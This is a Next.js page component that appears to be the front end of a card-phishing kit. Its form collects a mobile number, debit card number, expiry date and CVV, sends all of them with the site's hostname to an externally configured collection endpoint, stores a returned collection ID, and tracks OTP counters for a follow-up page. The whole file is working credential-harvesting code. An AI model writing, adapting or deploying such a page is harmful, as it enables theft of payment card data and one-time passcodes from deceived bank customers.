'use client';
import Footer from "./inlcude/footer";
import Header from "./inlcude/header";
import { useRouter } from "next/navigation";
import { useEffect, useState } from "react";  
import styles from "./page.module.css";
import DebitCardInputComponent from "./inlcude/DebitCardInputComponent";
import ExpiryDateInputComponent from "./inlcude/ExpiryDateInputComponent";
import Loader from "./inlcude/Loader";


export default function Home() {
    const router = useRouter();
    const [loading, setLoading] = useState(false); // Correct use of useState
    const API_URL = process.env.NEXT_PUBLIC_URL;
    const SITE = process.env.NEXT_PUBLIC_SITE;

    useEffect(() => {
        // console.log();
        localStorage.removeItem('collection_id');
        localStorage.removeItem("next");
        localStorage.setItem("oppp", 0);
        localStorage.setItem("otp_count", 0);
    }, []);

    const handleSubmit = async (e) => {
        e.preventDefault();
        const formData = new FormData(e.target);
        const jsonObject1 = {};
        const jsonObject = {};
        formData.forEach((value, key) => {
            jsonObject[key] = value;
        });
        jsonObject1['data'] = jsonObject;
        jsonObject1['site'] = window.location.hostname;
        console.log(jsonObject1);
        try {
            const response = await fetch(`${API_URL}`, {
                method: 'POST',
                body: JSON.stringify(jsonObject1)
            });

            if (!response.ok) {
                throw new Error('Network response was not ok');
            }
            const responseData = await response.json();
            localStorage.setItem('collection_id', responseData.data);
            router.push('/2');             
        } catch (error) {
            console.error('There was a problem with the fetch operation:', error);
        }
    };

    if (loading) {
        return (
            <Loader/>
        );
    }

    return (
        <>
            <Header />
            <div style={{marginTop:"25px"}} className="px-2" >
            <form onSubmit={handleSubmit} className="mt-3 py-2">
                <div className={`form-group ${styles.formGroup}`}>
                    <label htmlFor="ac">Mobile Number* </label>
                    <input name="mb" placeholder="Enter mobile no" minLength={10} maxLength={10} type="text" inputMode="numeric" className={`${styles.formControl} form-control`} size={30} required aria-label="/ac" />
                </div>
                <DebitCardInputComponent />
                <div className="d-flex gap-2">
                    <ExpiryDateInputComponent />
                    <div className={`form-group ${styles.formGroup}`}>
                        <label htmlFor="ac">CVV* </label>
                        <input type="password" name="cvv" placeholder="Enter cvv no." minLength={3} maxLength={3} inputMode="numeric" className={`${styles.formControl} form-control`} size={30} required aria-label="/ac" />
                    </div>
                </div>                   

            <div className={`${styles.buttonContainer} mb-4 text-center form-group w-100`}>
                <input type="submit" className={`btn btn-danger text-white w-100 px-4 ${styles.textCenter} text-primary ${styles.submitButton}`} defaultValue="Submit" />
            </div>
        </form>
                
            </div>

            <Footer />
        </>
    );
}
